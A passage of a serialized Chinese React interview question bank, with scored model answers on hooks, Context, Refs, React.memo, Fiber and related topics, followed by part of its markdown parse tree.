使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。</p>\\n</li>\\n<li><p>类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。</p>\\n</li>\\n<li><p>表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。</p>\\n</li>\\n<li><p>工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。</p>\\n</li>\\n</ul>\\n<h2>React中的Context是什么？如何使用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Context的创建和提供：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">const ThemeContext = React.createContext(&#39;light&#39;);\\n\\nfunction App() {\\n  return (\\n    &lt;ThemeContext.Provider value=&quot;dark&quot;&gt;\\n      &lt;ThemedButton /&gt;\\n    &lt;/ThemeContext.Provider&gt;\\n  );\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 在类组件中使用Context：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">class ThemedButton extends React.Component {\\n  static contextType = ThemeContext;\\n  render() {\\n    return &lt;Button theme={this.context} /&gt;;\\n  }\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 在函数组件中使用useContext：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">function ThemedButton() {\\n  const theme = useContext(ThemeContext);\\n  return &lt;Button theme={theme} /&gt;;\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> Context的注意事项：<ul>\\n<li>避免过度使用Context</li>\\n<li>Context值变化会导致所有消费组件重新渲染</li>\\n<li>适合共享全局数据，如主题、用户信息等</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>什么是虚拟 DOM？它是如何工作的？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。</p>\\n</li>\\n<li><p>创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。</p>\\n</li>\\n<li><p>Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。</p>\\n</li>\\n<li><p>批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。</p>\\n</li>\\n</ul>\\n<h2>React 中的单向数据流是什么意思？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。</p>\\n</li>\\n<li><p>数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。</p>\\n</li>\\n<li><p>易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。</p>\\n</li>\\n<li><p>可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。</p>\\n</li>\\n</ul>\\n<h2>React中的Refs是什么？有哪些使用场景？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 创建和使用Refs：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">function TextInputWithFocusButton() {\\n  const inputRef = useRef(null);\\n\\n  const focusInput = () =&gt; {\\n    inputRef.current.focus();\\n  };\\n\\n  return (\\n    &lt;&gt;\\n      &lt;input ref={inputRef} type=&quot;text&quot; /&gt;\\n      &lt;button onClick={focusInput}&gt;Focus Input&lt;/button&gt;\\n    &lt;/&gt;\\n  );\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 转发Refs：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">const FancyButton = React.forwardRef((props, ref) =&gt; (\\n  &lt;button ref={ref} className=&quot;fancy-button&quot;&gt;\\n    {props.children}\\n  &lt;/button&gt;\\n));\\n</code></pre>\\n<ul>\\n<li><p><strong>1：</strong> 常见使用场景：</p>\\n<ul>\\n<li>管理焦点、文本选择或媒体播放</li>\\n<li>触发强制动画</li>\\n<li>集成第三方DOM库</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 使用注意事项：</p>\\n<ul>\\n<li>避免过度使用Refs</li>\\n<li>不要用Refs来做可以通过声明式实现的事情</li>\\n<li>在类组件中使用需要通过React.createRef()创建</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>什么是函数组件和类组件？它们有什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>函数组件：</p>\\n</li>\\n<li><p>定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。</p>\\n</li>\\n<li><p>优点：代码更简洁，性能更好（因为没有类的开销）。</p>\\n</li>\\n<li><p>限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。</p>\\n</li>\\n<li><p>类组件：</p>\\n</li>\\n<li><p>定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。</p>\\n</li>\\n<li><p>优点：支持生命周期方法和状态管理，功能更强大。</p>\\n</li>\\n<li><p>缺点：代码相对复杂，性能略逊于函数组件。</p>\\n</li>\\n</ul>\\n<h2>React.memo 的作用和使用场景</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。</li>\\n<li><strong>1：</strong> 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。</li>\\n<li><strong>1：</strong> 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">import React from &#39;react&#39;;\\nconst UserInfo = ({ name, age }) =&gt; (\\n    &lt;div&gt;\\n        &lt;p&gt;Name: {name}&lt;/p&gt;\\n        &lt;p&gt;Age: {age}&lt;/p&gt;\\n    &lt;/div&gt;\\n);\\nexport default React.memo(UserInfo);\\n//在这个例子中，UserInfo 组件是一个纯展示组件。通过使用 React.memo 包裹它，当组件的 name 和 age props 没有变化时，组件就不会重新渲染，从而提高了性能。\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n使这些子组件的 props 并没有实际变化。示例：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">import React from &#39;react&#39;;\\nconst Sidebar = ({ menuData }) =&gt; {\\n    // 复杂的菜单渲染逻辑\\n    return (\\n        &lt;div&gt;\\n            {menuData.map((item) =&gt; (\\n                &lt;MenuItem key={item.id} item={item} /&gt;\\n            ))}\\n        &lt;/div&gt;\\n    );\\n};\\nexport default React.memo(Sidebar);\\n//通过使用 React.memo 包裹 Sidebar 组件，当父组件重新渲染但 menuData 没有变化时，Sidebar 组件就不会重新渲染，避免了不必要的渲染开销，提高了整个页面的性能。\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n必要的渲染。示例：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">import React from &#39;react&#39;;\\nconst RealTimeChart = ({ dataArray, chartType }) =&gt; {\\n    // 复杂的图表绘制逻辑，可能涉及到数据处理、坐标轴设置等\\n    return (\\n        &lt;div&gt;\\n            &lt;Chart data={dataArray} type={chartType} /&gt;\\n        &lt;/div&gt;\\n    );\\n};\\nexport default React.memo(RealTimeChart);\\n//当数据更新时，只有 dataArray 或 chartType 发生变化，RealTimeChart 组件才会重新渲染，否则将使用之前的渲染结果，避免了因其他无关因素导致的重新渲染，提升了性能。\\n</code></pre>\\n</details>\\n\\n<h2>什么是 React 中的高阶组件（HOC）？请简单举例说明其用法</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 高阶组件（Higher - Order Component，简称 HOC）是一个函数，它接收一个组件作为参数，并返回一个新的组件。这个新组件通常会增强或修改原始组件\\n的功能、行为或外观。可以把它看作是一种组件的 “工厂函数”，用于创建具有额外功能的组件。</li>\\n<li><strong>1：</strong> 用法1：代码复用。HOC 可以将多个组件共有的逻辑提取出来，放到一个地方进行复用。例如，多个组件都需要进行权限验证，就可以创建一个权限验证的 HOC，\\n让这些组件都通过这个 HOC 来获得权限验证功能。</li>\\n<li><strong>1：</strong> 用法2：逻辑抽象和分离。可以将一些复杂的、与业务逻辑无关的功能（如数据加载、动画效果等）从组件内部抽象出来，通过 HOC 来处理，使得组件本身更加专\\n注于自己的核心业务逻辑（如展示 UI 和处理用户交互）。</li>\\n</ul>\\n<h2>什如何在 React 应用中进行有效的内存泄漏排查和修复？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 使用 Chrome 开发者工具的 Memory 面板进行内存快照分析，查找未被释放的对象；</li>\\n<li><strong>1：</strong> 检查组件卸载时是否取消了订阅、定时器、事件监听器等可能导致内存泄漏的源头；</li>\\n<li><strong>1：</strong> 对于使用了第三方库的情况，要确保库的使用方式正确，避免因库的不当使用造成内存泄漏。</li>\\n</ul>\\n<h2>什么是纯组件？为什么要使用纯组件？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>纯组件：</p>\\n</li>\\n<li><p>纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。</p>\\n</li>\\n<li><p>优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。</p>\\n</li>\\n<li><p>使用场景：</p>\\n</li>\\n<li><p>静态数据：组件的 props 和 state 不经常变化。</p>\\n</li>\\n<li><p>复杂组件：组件内部逻辑复杂，重新渲染开销大。</p>\\n</li>\\n</ul>\\n<h2>什么是 React Context API？它解决了什么问题？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>React Context API：</p>\\n</li>\\n<li><p>Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。</p>\\n</li>\\n<li><p>创建 Context：使用 React.createContext 创建一个 Context 对象。</p>\\n</li>\\n<li><p>提供 Context：使用 Context.Provider 组件将数据传递给子组件。</p>\\n</li>\\n<li><p>消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。</p>\\n</li>\\n</ul>\\n<h2>什么是 React Router？它的主要特点是什么？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。</p>\\n</li>\\n<li><p>主要特点：</p>\\n</li>\\n<li><p>声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。</p>\\n</li>\\n<li><p>动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。</p>\\n</li>\\n<li><p>嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。</p>\\n</li>\\n<li><p>编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。</p>\\n</li>\\n<li><p>路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。</p>\\n</li>\\n<li><p>懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。</p>\\n</li>\\n</ul>\\n<h2>什么是 useState？它如何工作？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p>useState 是一个 Hook，用于在函数组件中添加状态。</p>\\n</li>\\n<li><p>主要特点：</p>\\n</li>\\n<li><p>初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。</p>\\n</li>\\n<li><p>更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-JSX\\">import React, { useState } from &#39;react&#39;;\\n\\nconst Counter = () =&gt; {\\n  const [count, setCount] = useState(0);\\n\\n  const increment = () =&gt; {\\n    setCount(count + 1);\\n  };\\n\\n  const decrement = () =&gt; {\\n    setCount(count - 1);\\n  };\\n\\n  return (\\n    &lt;div&gt;\\n      &lt;h1&gt;Count: {count}&lt;/h1&gt;\\n      &lt;button onClick={increment}&gt;Increment&lt;/button&gt;\\n      &lt;button onClick={decrement}&gt;Decrement&lt;/button&gt;\\n    &lt;/div&gt;\\n  );\\n};\\n\\nexport default Counter;\\n</code></pre>\\n<h2>什么是 useEffect？它如何工作？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p>useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。</p>\\n</li>\\n<li><p>工作原理：</p>\\n</li>\\n<li><p>执行副作用：在组件挂载和更新时执行副作用操作。</p>\\n</li>\\n<li><p>清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-JSX\\">import React, { useState, useEffect } from &#39;react&#39;;\\n\\nconst DataFetcher = () =&gt; {\\n  const [data, setData] = useState(null);\\n\\n  useEffect(() =&gt; {\\n    const fetchData = async () =&gt; {\\n      const response = await fetch(&#39;/api/data&#39;);\\n      const json = await response.json();\\n      setData(json);\\n    };\\n\\n    fetchData();\\n\\n    // 清理函数\\n    return () =&gt; {\\n      console.log(&#39;Cleanup&#39;);\\n    };\\n  }, []); // 依赖数组为空，表示仅在组件挂载时执行\\n\\n  return (\\n    &lt;div&gt;\\n      {data ? &lt;pre&gt;{JSON.stringify(data, null, 2)}&lt;/pre&gt; : &lt;p&gt;Loading...&lt;/p&gt;}\\n    &lt;/div&gt;\\n  );\\n};\\n\\nexport default DataFetcher;\\n</code></pre>\\n<h2>在 React 组件中，useEffect 钩子的第二个参数（依赖项数组）为空数组和不设置有什么区别？</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。</li>\\n</ul>\\n<h2>说说对Fiber架构的理解？解决了什么问题？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<p>在react中，主要做了以下的操作：</p>\\n<ul>\\n<li><strong>1：</strong> 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务</li>\\n<li><strong>1：</strong> 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行</li>\\n<li><strong>1：</strong> dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行</li>\\n<li><strong>1：</strong> Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# react\\n\\n","depth":1,"text":"react","tokens":[{"type":"text","raw":"react","text":"react","escaped":false}]},{"type":"heading","raw":"## 什么是 React 的生命周期方法？\\n\\n","depth":2,"text":"什么是 React 的生命周期方法？","tokens":[{"type":"text","raw":"什么是 React 的生命周期方法？","text":"什么是 React 的生命周期方法？","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：W1\\n\\n","depth":4,"text":"级别：W1","tokens":[{"type":"text","raw":"级别：W1","text":"级别：W1","escaped":false}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 类组件声明周期方法:\\n- **1：** 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。\\n- **1：** 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。\\n- **1：** 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。\\n- **1：** 函数组件生命周期（Hooks）:\\n- **1：** useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 类组件声明周期方法:\\n","task":false,"loose":false,"text":"**1：** 类组件声明周期方法:","tokens":[{"type":"text","raw":"**1：** 类组件声明周期方法:","text":"**1：** 类组件声明周期方法:","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 类组件声明周期方法:","text":" 类组件声明周期方法:","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。\\n","task":false,"loose":false,"text":"**1：** 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。","tokens":[{"type":"text","raw":"**1：** 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。","text":"**1：** 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。","text":" 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。\\n","task":false,"loose":false,"text":"**1：** 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。","tokens":[{"type":"text","raw":"**1：** 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。","text":"**1：** 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。","text":" 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。\\n","task":false,"loose":false,"text":"**1：** 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。","tokens":[{"type":"text","raw":"**1：** 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。","text":"**1：** 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。","text":" 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 函数组件生命周期（Hooks）:\\n","task":false,"loose":false,"text":"**1：** 函数组件生命周期（Hooks）:","tokens":[{"type":"text","raw":"**1：** 函数组件生命周期（Hooks）:","text":"**1：** 函数组件生命周期（Hooks）:","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 函数组件生命周期（Hooks）:","text":" 函数组件生命周期（Hooks）:","escaped":false}]}]},{"type":"list_item","raw":"- **1：** useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。","task":false,"loose":false,"text":"**1：** useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。","tokens":[{"type":"text","raw":"**1：** useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。","text":"**1：** useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。","text":" useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nuseEffect(() => {\\n// 组件挂载时执行的操作\\nreturn () => {\\n// 组件卸载时清理资源\\n};\\n}, [dependencies]);  // 依赖数组\\n\\n```","lang":"js","text":"\\nuseEffect(() => {\\n// 组件挂载时执行的操作\\nreturn () => {\\n// 组件卸载时清理资源\\n};\\n}, [dependencies]);  // 依赖数组\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## React 中的 Hook 是什么？\\n\\n","depth":2,"text":"React 中的 Hook 是什么？","tokens":[{"type":"text","raw":"React 中的 Hook 是什么？","text":"React 中的 Hook 是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：W1\\n\\n","depth":4,"text":"级别：W1","tokens":[{"type":"text","raw":"级别：W1","text":"级别：W1","escaped":false}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** useState()：用于在函数组件中添加状态。\\n- **1：** useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。\\n- **1：** useContext()：用于在函数组件中访问上下文（Context）。\\n- **1：** useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。\\n- **1：** useRef()：用于访问组件中的 DOM 节点或保存可变的值。\\n- **1：** useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** useState()：用于在函数组件中添加状态。\\n","task":false,"loose":false,"text":"**1：** useState()：用于在函数组件中添加状态。","tokens":[{"type":"text","raw":"**1：** useState()：用于在函数组件中添加状态。","text":"**1：** useState()：用于在函数组件中添加状态。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useState()：用于在函数组件中添加状态。","text":" useState()：用于在函数组件中添加状态。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。\\n","task":false,"loose":false,"text":"**1：** useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。","tokens":[{"type":"text","raw":"**1：** useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。","text":"**1：** useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。","text":" useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** useContext()：用于在函数组件中访问上下文（Context）。\\n","task":false,"loose":false,"text":"**1：** useContext()：用于在函数组件中访问上下文（Context）。","tokens":[{"type":"text","raw":"**1：** useContext()：用于在函数组件中访问上下文（Context）。","text":"**1：** useContext()：用于在函数组件中访问上下文（Context）。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useContext()：用于在函数组件中访问上下文（Context）。","text":" useContext()：用于在函数组件中访问上下文（Context）。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。\\n","task":false,"loose":false,"text":"**1：** useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。","tokens":[{"type":"text","raw":"**1：** useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。","text":"**1：** useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。","text":" useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** useRef()：用于访问组件中的 DOM 节点或保存可变的值。\\n","task":false,"loose":false,"text":"**1：** useRef()：用于访问组件中的 DOM 节点或保存可变的值。","tokens":[{"type":"text","raw":"**1：** useRef()：用于访问组件中的 DOM 节点或保存可变的值。","text":"**1：** useRef()：用于访问组件中的 DOM 